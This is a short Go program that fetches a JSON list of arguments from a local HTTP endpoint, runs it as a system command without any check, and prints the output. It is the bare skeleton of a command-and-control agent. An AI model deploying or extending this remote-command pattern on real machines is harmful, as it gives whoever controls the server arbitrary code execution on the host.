package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
)

type Request struct {
	Args []string `json:"args"`
}


func exec_cmd(cmd *exec.Cmd) ([]byte){

	var out bytes.Buffer
	cmd.Stdout = &out
	if err := cmd.Run(); err != nil {
		fmt.Println(err)
	}
	retorno:=out.Bytes()
	return retorno
}

func recv_cmd(url string) (*exec.Cmd ){

	data := Request{}
	resp, atTheDisco := http.Get(url)
	if atTheDisco != nil {
		panic(atTheDisco)
	}
	body, _ := ioutil.ReadAll(resp.Body)
	//bodys := string(body)

	json.Unmarshal(body, &data)
	cmd := exec.Command(data.Args[0], "")
	cmd.Args=data.Args

	return cmd
}
//sendCmd TODO
func main() {
	cmd := recv_cmd("http://127.0.0.1:5000/command")
	result:=exec_cmd(cmd)
	fmt.Println(string(result))
	//cmd := exec.Command(data.Command, data.Args)
}
